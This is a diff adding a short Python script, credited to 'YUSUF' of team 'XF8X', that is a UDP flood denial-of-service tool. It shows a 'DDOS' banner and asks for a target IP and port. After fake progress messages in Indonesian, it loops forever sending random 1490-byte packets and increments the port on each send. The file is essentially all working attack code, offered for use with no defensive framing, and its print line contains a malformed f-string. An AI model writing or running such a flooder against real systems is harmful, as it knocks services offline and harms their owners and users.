@@ -1,0 +1,77 @@
+# ./Author : HACODE
+import os
+import random
+import sys
+import time
+import socket
+from datetime import datetime
+
+
+#Colour
+yellow='\033[93m'
+gren='\033[92m'
+cyan='\033[96m'
+pink='\033[95m'
+red='\033[91m'
+b='\033[1m'
+
+#
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+
+month = now.month
+year = now.year
+
+
+def logo():
+	os.system('clear')
+	print(pink+red+b+'''
+	           █▀▄ █▀▄ █▀█ █▀  
+	           █▄▀ █▄▀ █▄█ ▄█  
+	
+                   YUSUF   '''+b+red+pink)
+	
+
+
+
+
+#
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+
+#
+def first(self):
+	logo()
+	print("")
+	print(pink+b+"Author     : YUSUF"+b+pink)
+	print("Team	    : XF8X")
+	print("YouTube    : YUSUF307")
+	print("")
+	
+	#
+	ip = input(gren+b+"Target IP  : "+b+gren)
+	port = int(input("Enter Port  : "))
+	print("")
+	print(cyan+b+"[+]--                            [+] 0%"+b+cyan)
+	time.sleep(2)
+	print("[+]-- KEMAS>                    [+] 25%")
+	time.sleep(2)
+	print("[+]-- LOGISTIK--------->               [+] 50%")
+	time.sleep(3)
+	print("[+]-- OTW KIRIM-------------->          [+] 75%")
+	time.sleep(2)
+	print(cyan+b+"[+]--DATANG------------------>     [+] 100%"+b+cyan)
+	time.sleep(2)
+	os.system('clear')
+	sent = 0
+	
+	while True:
+		sock.sendto(bytes, (ip, port))
+		sent = sent + 1
+		port = port + 1
+		
+		print(f"PAKET SANTET:} :- sent %s packet to %s througj port:%s"%(sent,ip,port))
+
+first('f')
